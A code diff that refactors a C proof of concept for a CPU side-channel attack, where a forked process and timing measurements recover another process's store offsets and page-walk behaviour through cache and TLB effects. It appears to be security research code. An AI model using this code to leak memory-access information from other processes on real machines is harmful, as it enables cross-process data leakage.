@@ -9,9 +9,6 @@
 #include "utils.h"
 #include "ptedit_header.h"
 
-static u32 threshold; // cache hit threshold
-static u8 *victim_page, *normal_page, *probe, *garbage; // some handy pages
-
 // assuming 4KB page and 4-level PT
 #define PAGE_SHIFT (12u)
 #define PAGE_SIZE (1u << PAGE_SHIFT)
@@ -44,11 +41,13 @@ static int __attribute__((noinline)) store_offset_recovery() {
     const u32 MEASURES = 1000;
     pid_t pid = fork();
     if (pid == 0) {
-        usleep(100); // a little sleep helps
+        usleep(10); // a little sleep helps
+        u8 *victim_page = setup_page(NULL, PAGE_SIZE, 0);
+        if (!victim_page) return 1;
         while (true) {
             // normal_page is NOT shared, the child process will make a copy on
             // write
-            _mwrite(&normal_page[VICTIM_STORE_OFFSET], 0xff);
+            _mwrite(&victim_page[VICTIM_STORE_OFFSET], 0xff);
         }
     } else if (pid < 0) {
         fprintf(stderr, "Failed to fork.\n");
@@ -138,7 +137,7 @@ static int __attribute__((noinline)) load_page_recovery_throughput() {
     if (pid == 0) {
         // sender
         i32 idx = -WARMUP;
-        usleep(rand() % 256);
+        usleep(10);
 
         while (true) {
             u64 cnt = 0;
@@ -162,15 +161,20 @@ static int __attribute__((noinline)) load_page_recovery_throughput() {
         return 2;
     }
 
+    u8 *victim_page = setup_page(NULL, PAGE_SIZE, 0);
+    if (!victim_page) {
+        ret = 3;
+        goto mmap_fail;
+    }
     // receiver
     for (u32 iter = 0; iter < INDEX_COUNT + WARMUP; iter++) {
         u8 *ptr;
         if (iter >= WARMUP) {
             ptr = victim_page + ((iter - WARMUP) << 3); // align to 8-byte
         } else {
-            ptr = garbage;
+            ptr = victim_page;
         }
-        usleep(rand() % 256);
+        usleep(10);
         *start = 1; // start measurement in sender
         _mfence();
         _lfence();
@@ -187,6 +191,8 @@ static int __attribute__((noinline)) load_page_recovery_throughput() {
         printf("%#5x\t%lu\n", disp, counts[disp]);
     }
 
+    munmap(victim_page, PAGE_SIZE);
+mmap_fail:
     kill(pid, SIGKILL);
     munmap(counts, PAGE_SIZE);
     munmap((u8 *)start, sizeof(u8));
@@ -216,7 +222,7 @@ static int __attribute__((noinline)) load_page_recovery_contention() {
 
     pid_t pid = fork();
     if (pid == 0) {
-        usleep(rand() % 256);
+        usleep(10);
         u32 idx = 0;
         while (true) {
             ptedit_invalidate_tlb(page);
@@ -227,17 +233,22 @@ static int __attribute__((noinline)) load_page_recovery_contention() {
         return 2;
     }
 
+    u8 *victim_page = setup_page(NULL, PAGE_SIZE, 0);
+    if (!victim_page) {
+        ret = 3;
+        goto mmap_fail;
+    }
     for (u32 iter = 0; iter < INDEX_COUNT + WARMUP; iter++) {
         u32 disp = iter - WARMUP;
         u8 *ptr;
         if (iter >= WARMUP) {
             ptr = victim_page + (disp << 3); // align to 8-byte
         } else {
-            ptr = garbage;
+            ptr = victim_page;
         }
         u32 sig;
         u64 total_time = 0, t_start;
-        usleep(rand() % 256);
+        usleep(10);
         // measure execution latency for MEASURES times
         // we should observe a smaller latency if our store stalls page walk
         // in the sender, since more L1D resources would be available
@@ -252,6 +263,8 @@ static int __attribute__((noinline)) load_page_recovery_contention() {
             printf("%#5x\t%lu\n", disp, total_time / MEASURES);
     }
 
+    munmap(victim_page, PAGE_SIZE);
+mmap_fail:
     kill(pid, SIGKILL);
     munmap(page, PAGE_SIZE);
     return ret;
@@ -276,21 +289,6 @@ int main(int argc, char **argv) {
         return -1;
     }
     int ret = 0;
-
-    threshold = _get_cache_hit_threshold();
-    fprintf(stderr, "Cache Hit Threshold: %u\n", threshold);
-
-    victim_page = setup_page(NULL, PAGE_SIZE, 0x1 /* init value */);
-    normal_page = setup_page(NULL, PAGE_SIZE, 0x2);
-    probe = setup_page(NULL, PAGE_SIZE * 2, 0x0);
-    garbage = setup_page(NULL, PAGE_SIZE * 2, 0x0);
-    if (!victim_page || !normal_page || !probe || !garbage) {
-        fprintf(stderr, "Failed to allocate pages.\n");
-        ret = -2;
-        goto mmap_fail;
-    }
-
-    srand(0);
     if (strcmp(argv[1], STORE_OFFSET_POC) == 0) {
         ret = store_offset_recovery();
     } else if (strcmp(argv[1], LOAD_PAGE_TRP_POC) == 0) {
@@ -299,15 +297,9 @@ int main(int argc, char **argv) {
         ret = load_page_recovery_contention();
     } else {
         fprintf(stderr, "Unknown argument \"%s\"", argv[1]);
-        goto arg_fail;
+        ret = 1;
     }
 
-arg_fail:
-mmap_fail:
-    munmap(victim_page, PAGE_SIZE);
-    munmap(normal_page, PAGE_SIZE);
-    munmap(probe, PAGE_SIZE * 2);
-    munmap(garbage, PAGE_SIZE * 2);
     ptedit_cleanup();
     return ret;
 }
